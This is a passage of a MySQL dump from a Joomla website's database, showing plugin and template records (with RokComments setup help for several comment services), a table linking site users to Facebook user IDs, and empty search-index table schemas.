blog\\/site\\\"<\\/strong> from the dropdown. Enter the URL to your website and click Next Step. for Step 2, choose <strong>Generic Install<\\/strong> from the options, then click Next Step.  This last page has the JavaScript that you normally would need to install the comments.<\\/p>\\n      <p>Just save the long string variable that is displayed in the <strong>idcomments_acct<\\/strong> var. This is the only thing you will need to configure RokComments to use IntenseDebate.\\n      <\\/p>\\n      <h3>Configure<\\/h3>\\n      <p>Open up the <strong>RokComments Content Plugin<\\/strong> via the <strong>Plugin Manager<\\/strong> in the Joomla Administrator.  Set the following attributes:<\\/p>\\n      <ol>\\n          <li>Set <strong>Comment System<\\/strong> to <strong class=\\\"under\\\">IntenseDebate<\\/strong><\\/li>\\n          <li>Enable\\/Disable the <strong>Show Comment Count<\\/strong> and the <strong>Show Comment Icon<\\/strong> options as you desire.<\\/li>\\n          <li>If you are using <strong class=\\\"under\\\">Menus + Categories<\\/strong> for the Activation Method, ensure you select the correct <strong>Menus<\\/strong> and\\/or <strong>Categories<\\/strong> where you would like the comments to show.<\\/li>\\n          <li>In the <strong>IntenseDebate Account<\\/strong> input field, put the <strong class=\\\"under\\\">idcomments_act<\\/strong> value you saved earlier. eg: <strong class=\\\"under\\\">2a8f5c96e2fb1deb5a485678a9c523f0<\\/strong> <\\/li>\\n      <\\/ol>\\n\\n      <a name=\\\"facebook\\\"><\\/a>\\n      <h2>Facebook<\\/h2>\\n      <p><img src=\\\"..\\/plugins\\/content\\/rokcomments\\/images\\/fb-appid.jpg\\\" \\\"\\/>The first step to integrating Facebook comments is to sign up as a Facebook developer.  To do this you must enable and authorize the <strong>Facebook Developer<\\/strong> application to access your Facebook account. Visit the <a href=\\\"https:\\/\\/developers.facebook.com\\/apps\\\" target=\\\"_new\\\">FaceBook App Here<\\/a> and click <strong>\\\"Allow\\\"<\\/strong>.  The next step is to click the <strong>\\\"+ Create New App\\\"<\\/strong> button on the \\\"Apps\\\" page.  Enter something like <strong>\\\"MySite Comments\\\"<\\/strong> in the App Display Name field, and some unique name for the App Namespace, such as <strong>\\\"mysite-comments\\\"<\\/strong>, review and agree to the Facebook Platform Policies and click \\\"Continue\\\". Enter the Security Check validation and click \\\"Submit\\\".  The next page is the <strong>\\\"Basic Settings\\\"<\\/strong> and here you need to enter your domain for the <strong>App Domain<\\/strong>, eg: <strong class=\\\"under\\\">mysite.com<\\/strong>.  You also need to click the <strong>Website<\\/strong> block in the \\\"Select how your app integrates with Facebook\\\" section and put the URL of your website, eg: <strong class=\\\"under\\\">http:\\/\\/www.mysite.com<\\/strong>.<\\/p>\\n      <p>Lastly copy the <strong>App ID<\\/strong> value as you will need this to configure RokComments to use Facebook.<\\/p>\\n      <h3>Configure<\\/h3>\\n      <p>Open up the <strong>RokComments Content Plugin<\\/strong> via the <strong>Plugin Manager<\\/strong> in the Joomla Administrator.  Set the following attributes:<\\/p>\\n      <ol>\\n          <li>Set <strong>Comment System<\\/strong> to <strong class=\\\"under\\\">Facebook<\\/strong><\\/li>\\n          <li>Enable\\/Disable the <strong>Show Comment Count<\\/strong> option as you desire. <strong>Show Comment Icon<\\/strong> has no effect for Facebook.<\\/li>\\n          <li>If you are using <strong class=\\\"under\\\">Menus + Categories<\\/strong> for the Activation Method, ensure you select the correct <strong>Menus<\\/strong> and\\/or <strong>Categories<\\/strong> where you would like the comments to show.<\\/li>\\n          <li>In the <strong>Facebook AppId<\\/strong> input field, put the <strong class=\\\"under\\\">App ID<\\/strong> value you saved earlier. eg: <strong class=\\\"under\\\">236773289710058<\\/strong> <\\/li>\\n          <li>Enter the width in pixels of the comment area, just adjust this field till it fits nicely under your content<\\/li>\\n          <li>Enter a comma separated list of Facebook User IDs of people you want to be able to moderate these comments.  Alternatively you can moderate them via the <a href=\\\"http:\\/\\/developers.facebook.com\\/tools\\/comments\\\" target=\\\"_new\\\">Developer Tools<\\/a><\\/li>\\n      <\\/ol>\\n\\n      <a name=\\\"disqus\\\"><\\/a>\\n      <h2>Disqus<\\/h2>\\n      <p><img src=\\\"..\\/plugins\\/content\\/rokcomments\\/images\\/dis-shortname.jpg\\\" \\\"\\/>In order to use Disqus comments you need to first Sign Up at <a href=\\\"http:\\/\\/disqus.com\\/\\\" target=\\\"_new\\\">http:\\/\\/disqus.com<\\/a>.  After signing up you need to click the <strong>\\\"+ Add\\\"<\\/strong> button in the <strong>Your Sites<\\/strong> sidebar section.  Fill in the form with your information for the your site.<\\/p>\\n      <p>The <strong>\\\"shortname\\\"<\\/strong> is important as this is the unique identifier you will use when configuring RokComments.  On the Settings panel configure the options as you like, or just leave the defaults before hitting continue.  You will be able to moderate these comments directly by going to the shortname url, eg: <strong>http:\\/\\/mysite.disqus.com<\\/strong>.<\\/p>\\n      <h3>Configure<\\/h3>\\n      <p>Open up the <strong>RokComments Content Plugin<\\/strong> via the <strong>Plugin Manager<\\/strong> in the Joomla Administrator.  Set the following attributes:<\\/p>\\n      <ol>\\n          <li>Set <strong>Comment System<\\/strong> to <strong class=\\\"under\\\">Disqus<\\/strong><\\/li>\\n          <li>Enable\\/Disable the <strong>Show Comment Count<\\/strong> and the <strong>Show Comment Icon<\\/strong> options as you desire.<\\/li>\\n          <li>If you are using <strong class=\\\"under\\\">Menus + Categories<\\/strong> for the Activation Method, ensure you select the correct <strong>Menus<\\/strong> and\\/or <strong>Categories<\\/strong> where you would like the comments to show.<\\/li>\\n          <li>In the <strong>Disqus Shorname<\\/strong> input field, put the <strong class=\\\"under\\\">shortname<\\/strong> value you saved earlier. eg: <strong class=\\\"under\\\">mysite<\\/strong> <\\/li>\\n          <li>If you need to test the comments on an inaccessible website during development you can enable the <strong>Developer Mode<\\/strong> option here.<\\/li>\\n      <\\/ol>\\n\\n      <a name=\\\"livefyre\\\"><\\/a>\\n      <h2>Livefyre<\\/h2>\\n      <p><img src=\\\"..\\/plugins\\/content\\/rokcomments\\/images\\/lf-siteid.jpg\\\" \\\"\\/>The first step to installing Livefyre comments on your site is to Sign Up via the <a href=\\\"http:\\/\\/www.livefyre.com\\\" target=\\\"_new\\\">http:\\/\\/www.livefyre.com<\\/a> website.  When you have signed up, you should click <strong>\\\"Install\\\"<\\/strong> or go directly to the <a href=\\\"http:\\/\\/www.livefyre.com\\/install\\/\\\" target=\\\"_new\\\">install URL<\\/a>. Enter the URL of your site and then click the <strong>\\\"Custom\\\"<\\/strong> option for the <strong>Platform<\\/strong>, and then click the \\\"Keep Going!\\\" button.<\\/p>\\n      <p>That\'s all there is to it.  You will be provided with a chunk of JavaScript, but all you need to do is copy the numeric <strong>site_id<\\/strong> variable as this will be used to configure RokComments to use Livefyre.<\\/p>\\n\\n      <h3>Configure<\\/h3>\\n      <p>Open up the <strong>RokComments Content Plugin<\\/strong> via the <strong>Plugin Manager<\\/strong> in the Joomla Administrator.  Set the following attributes:<\\/p>\\n      <ol>\\n          <li>Set <strong>Comment System<\\/strong> to <strong class=\\\"under\\\">Livefyre<\\/strong><\\/li>\\n          <li>NOTE: Comment Counts are not supported in Livefyre currently, so those options will be ignored.<\\/li>\\n          <li>If you are using <strong class=\\\"under\\\">Menus + Categories<\\/strong> for the Activation Method, ensure you select the correct <strong>Menus<\\/strong> and\\/or <strong>Categories<\\/strong> where you would like the comments to show.<\\/li>\\n          <li>In the <strong>Livefyre Site ID<\\/strong> input field, put the <strong class=\\\"under\\\">site_id<\\/strong> value you saved earlier. eg: <strong class=\\\"under\\\">291224<\\/strong> <\\/li>\\n      <\\/ol>\\n      \\n      <\\/div>\\n      <style>\\n          .rc-wrapper h1 {margin-left:0;}\\n          .rc-wrapper h2 {margin-top:40px;color:#333;}\\n          span.readonly .rc-wrapper {font-weight:normal;}\\n          .rc-wrapper img {float:right;margin:0 0 20px 20px;}\\n          .rc-wrapper .under {text-decoration:underline;}\\n          .rc-wrapper li {list-style-type:decimal !important;margin-left:30px;}\\n          .plg-desc {margin-left:0 !Important;}\\n      <\\/style>\\n      \\n    \",\"group\":\"\"}','{\"system\":\"1\",\"spacer_global\":\"\",\"showcount\":\"1\",\"showicon\":\"rk-icon\",\"tagmode\":\"0\",\"method\":\"id\",\"spacer_menus_cats\":\"\",\"menus\":\"\",\"categories\":\"\",\"spacer_intense\":\"\",\"id-account\":\"\",\"spacer_facebook\":\"\",\"fb-appid\":\"\",\"fb-width\":\"500\",\"fb-postcount\":\"10\",\"fb-modid\":\"\",\"spacer_disq\":\"\",\"d-subdomain\":\"\",\"d-devmode\":\"0\",\"spacer_livefyre\":\"\",\"lf-siteid\":\"\",\"spacer_jskit\":\"\",\"js-domain\":\"\"}','','',0,'0000-00-00 00:00:00',1,0),(10219,'Button - RokComments','plugin','rokcomments','editors-xtd',0,1,1,0,'{\"legacy\":false,\"name\":\"Button - RokComments\",\"type\":\"plugin\",\"creationDate\":\"March 4, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.0.2\",\"description\":\"Inserts the plugin code for RokComments\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',1,0),(10220,'isis','template','isis','',1,1,1,0,'{\"name\":\"isis\",\"type\":\"template\",\"creationDate\":\"3\\/30\\/2012\",\"author\":\"Kyle Ledbetter\",\"copyright\":\"Copyright (C) 2005 - 2012 Open Source Matters, Inc. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"\",\"version\":\"1.0\",\"description\":\"TPL_ISIS_XML_DESCRIPTION\",\"group\":\"\"}','{\"templateColor\":\"\",\"logoFile\":\"\"}','','',0,'0000-00-00 00:00:00',0,0),(10221,'protostar','template','protostar','',0,1,1,0,'{\"name\":\"protostar\",\"type\":\"template\",\"creationDate\":\"4\\/30\\/2012\",\"author\":\"Kyle Ledbetter\",\"copyright\":\"Copyright (C) 2005 - 2012 Open Source Matters, Inc. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"\",\"version\":\"1.0\",\"description\":\"TPL_PROTOSTAR_XML_DESCRIPTION\",\"group\":\"\"}','{\"templateColor\":\"\",\"logoFile\":\"\",\"googleFont\":\"1\",\"googleFontName\":\"Open+Sans\",\"fluidContainer\":\"0\"}','','',0,'0000-00-00 00:00:00',0,0),(10222,'beez3','template','beez3','',0,1,1,0,'{\"legacy\":false,\"name\":\"beez3\",\"type\":\"template\",\"creationDate\":\"25 November 2009\",\"author\":\"Angie Radtke\",\"copyright\":\"Copyright (C) 2005 - 2012 Open Source Matters, Inc. All rights reserved.\",\"authorEmail\":\"a.radtke@derauftritt.de\",\"authorUrl\":\"http:\\/\\/www.der-auftritt.de\",\"version\":\"1.6.0\",\"description\":\"TPL_BEEZ3_XML_DESCRIPTION\",\"group\":\"\"}','{\"wrapperSmall\":\"53\",\"wrapperLarge\":\"72\",\"sitetitle\":\"\",\"sitedescription\":\"\",\"navposition\":\"center\",\"templatecolor\":\"nature\"}','','',0,'0000-00-00 00:00:00',0,0),(10223,'plg_installer_webinstaller','plugin','webinstaller','installer',0,1,1,0,'{\"name\":\"plg_installer_webinstaller\",\"type\":\"plugin\",\"creationDate\":\"18 December 2013\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2013 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"1.0.5\",\"description\":\"PLG_INSTALLER_WEBINSTALLER_XML_DESCRIPTION\",\"group\":\"\"}','{\"tab_position\":\"0\"}','','',0,'0000-00-00 00:00:00',0,0),(10224,'plg_editors_jce','plugin','jce','editors',0,1,1,0,'{\"name\":\"plg_editors_jce\",\"type\":\"plugin\",\"creationDate\":\"12 December 2013\",\"author\":\"Ryan Demmer\",\"copyright\":\"2006-2010 Ryan Demmer\",\"authorEmail\":\"info@joomlacontenteditor.net\",\"authorUrl\":\"http:\\/\\/www.joomlacontenteditor.net\",\"version\":\"2.3.4.4\",\"description\":\"WF_EDITOR_PLUGIN_DESC\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10225,'plg_quickicon_jcefilebrowser','plugin','jcefilebrowser','quickicon',0,1,1,0,'{\"name\":\"plg_quickicon_jcefilebrowser\",\"type\":\"plugin\",\"creationDate\":\"12 December 2013\",\"author\":\"Ryan Demmer\",\"copyright\":\"Copyright (C) 2006 - 2013 Ryan Demmer. All rights reserved\",\"authorEmail\":\"@@email@@\",\"authorUrl\":\"www.joomalcontenteditor.net\",\"version\":\"2.3.4.4\",\"description\":\"PLG_QUICKICON_JCEFILEBROWSER_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10226,'jce','component','com_jce','',1,1,0,0,'{\"name\":\"JCE\",\"type\":\"component\",\"creationDate\":\"12 December 2013\",\"author\":\"Ryan Demmer\",\"copyright\":\"Copyright (C) 2006 - 2013 Ryan Demmer. All rights reserved\",\"authorEmail\":\"info@joomlacontenteditor.net\",\"authorUrl\":\"www.joomlacontenteditor.net\",\"version\":\"2.3.4.4\",\"description\":\"WF_ADMIN_DESC\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10228,'B2J Contact','module','mod_b2jcontact','',0,1,0,0,'{\"name\":\"B2J Contact\",\"type\":\"module\",\"creationDate\":\"March 2014\",\"author\":\"Bang2Joom\",\"copyright\":\"Copyright 2012 Bang2Joom. All rights reserved.\",\"authorEmail\":\"info@bang2joom.com\",\"authorUrl\":\"http:\\/\\/www.bang2joom.com\",\"version\":\"2.0\",\"description\":\"MOD_B2JCONTACT_DESCRIPTION\",\"group\":\"\"}','{\"module_class_sfx\":\"b2j_contact\"}','','',0,'0000-00-00 00:00:00',0,0),(10229,'com_b2jcontact','component','com_b2jcontact','',1,1,0,0,'{\"name\":\"COM_B2JCONTACT\",\"type\":\"component\",\"creationDate\":\"March 2014\",\"author\":\"Bang2Joom\",\"copyright\":\"Copyright 2013 Bang2Joom. All rights reserved.\",\"authorEmail\":\"info@bang2joom.com\",\"authorUrl\":\"http:\\/\\/www.bang2joom.com\",\"version\":\"2.0\",\"description\":\"\",\"group\":\"\"}','{\"adminemailfrom\":{\"select\":\"admin\"},\"adminemailreplyto\":{\"select\":\"submitter\"},\"submitteremailfrom\":{\"select\":\"admin\"},\"submitteremailreplyto\":{\"select\":\"admin\"}}','','',0,'0000-00-00 00:00:00',0,0),(10230,'B2J Contact','library','b2jcontact','',0,1,1,0,'{\"name\":\"B2J Contact\",\"type\":\"library\",\"creationDate\":\"March 2014\",\"author\":\"Bang2Joom\",\"copyright\":\"Copyright 2012 Bang2Joom. All rights reserved.\",\"authorEmail\":\"info@bang2joom.com\",\"authorUrl\":\"http:\\/\\/www.bang2joom.com\",\"version\":\"2.0\",\"description\":\"\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0);
/*!40000 ALTER TABLE `hfa_extensions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_facebook_joomla_connect`
--

DROP TABLE IF EXISTS `hfa_facebook_joomla_connect`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_facebook_joomla_connect` (
  `joomla_userid` int(15) NOT NULL,
  `facebook_userid` bigint(20) unsigned NOT NULL,
  `joined_date` int(15) NOT NULL,
  `linked` smallint(4) NOT NULL,
  PRIMARY KEY (`joomla_userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_facebook_joomla_connect`
--

LOCK TABLES `hfa_facebook_joomla_connect` WRITE;
/*!40000 ALTER TABLE `hfa_facebook_joomla_connect` DISABLE KEYS */;
INSERT INTO `hfa_facebook_joomla_connect` VALUES (255,4913635,1365032928,1),(256,4938502,1365543416,1),(257,1102211,1365551614,1),(269,681461513,1367863954,1),(290,776953738,1368737916,1),(262,4941934,1369751496,1),(314,4934145,1369851911,1),(320,12821478,1369963387,1),(326,100000483668001,1372223207,1),(327,100000842228686,1378773663,1);
/*!40000 ALTER TABLE `hfa_facebook_joomla_connect` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_filters`
--

DROP TABLE IF EXISTS `hfa_finder_filters`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_filters` (
  `filter_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL,
  `alias` varchar(255) NOT NULL,
  `state` tinyint(1) NOT NULL DEFAULT '1',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL,
  `created_by_alias` varchar(255) NOT NULL,
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `map_count` int(10) unsigned NOT NULL DEFAULT '0',
  `data` text NOT NULL,
  `params` mediumtext,
  PRIMARY KEY (`filter_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_filters`
--

LOCK TABLES `hfa_finder_filters` WRITE;
/*!40000 ALTER TABLE `hfa_finder_filters` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_filters` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links`
--

DROP TABLE IF EXISTS `hfa_finder_links`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links` (
  `link_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `url` varchar(255) NOT NULL,
  `route` varchar(255) NOT NULL,
  `title` varchar(255) DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  `indexdate` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `md5sum` varchar(32) DEFAULT NULL,
  `published` tinyint(1) NOT NULL DEFAULT '1',
  `state` int(5) DEFAULT '1',
  `access` int(5) DEFAULT '0',
  `language` varchar(8) NOT NULL,
  `publish_start_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_end_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `start_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `end_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `list_price` double unsigned NOT NULL DEFAULT '0',
  `sale_price` double unsigned NOT NULL DEFAULT '0',
  `type_id` int(11) NOT NULL,
  `object` mediumblob NOT NULL,
  PRIMARY KEY (`link_id`),
  KEY `idx_type` (`type_id`),
  KEY `idx_title` (`title`),
  KEY `idx_md5` (`md5sum`),
  KEY `idx_url` (`url`(75)),
  KEY `idx_published_list` (`published`,`state`,`access`,`publish_start_date`,`publish_end_date`,`list_price`),
  KEY `idx_published_sale` (`published`,`state`,`access`,`publish_start_date`,`publish_end_date`,`sale_price`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links`
--

LOCK TABLES `hfa_finder_links` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_terms0`
--

DROP TABLE IF EXISTS `hfa_finder_links_terms0`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_terms0` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_terms0`
--

LOCK TABLES `hfa_finder_links_terms0` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_terms0` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_terms0` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_terms1`
--

DROP TABLE IF EXISTS `hfa_finder_links_terms1`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_terms1` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_terms1`
--

LOCK TABLES `hfa_finder_links_terms1` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_terms1` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_terms1` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_terms2`
--

DROP TABLE IF EXISTS `hfa_finder_links_terms2`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_terms2` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_terms2`
--

LOCK TABLES `hfa_finder_links_terms2` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_terms2` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_terms2` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_terms3`
--

DROP TABLE IF EXISTS `hfa_finder_links_terms3`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_terms3` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_terms3`
--

LOCK TABLES `hfa_finder_links_terms3` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_terms3` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_terms3` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_terms4`
--

DROP TABLE IF EXISTS `hfa_finder_links_terms4`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_terms4` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_terms4`
--

LOCK TABLES `hfa_finder_links_terms4` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_terms4` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_terms4` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_terms5`
--

DROP TABLE IF EXISTS `hfa_finder_links_terms5`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_terms5` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_terms5`
--

LOCK TABLES `hfa_finder_links_terms5` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_terms5` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_terms5` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_terms6`
--

DROP TABLE IF EXISTS `hfa_finder_links_terms6`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_terms6` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_terms6`
--

LOCK TABLES `hfa_finder_links_terms6` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_terms6` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_terms6` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_terms7`
--

DROP TABLE IF EXISTS `hfa_finder_links_terms7`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_terms7` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_terms7`
--

LOCK TABLES `hfa_finder_links_terms7` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_terms7` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_terms7` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_terms8`
--

DROP TABLE IF EXISTS `hfa_finder_links_terms8`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_terms8` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_terms8`
--

LOCK TABLES `hfa_finder_links_terms8` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_terms8` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_terms8` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_terms9`
--

DROP TABLE IF EXISTS `hfa_finder_links_terms9`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_terms9` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_finder_links_terms9`
--

LOCK TABLES `hfa_finder_links_terms9` WRITE;
/*!40000 ALTER TABLE `hfa_finder_links_terms9` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_finder_links_terms9` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_finder_links_termsa`
--

DROP TABLE IF EXISTS `hfa_finder_links_termsa`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_finder_links_termsa` (
  `link_id` int(10) unsigned NOT NULL,
  `term_id` int(10) unsigned NOT NULL,
  `weight` float unsigned NOT NULL,
  PRIMARY KEY (`link_id`,`term_id`),
  KEY `idx_term_weight` (`term_id`,`weight`),
  KEY `idx_link_term_weight` (`link_id`,`term_id`,`weight`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
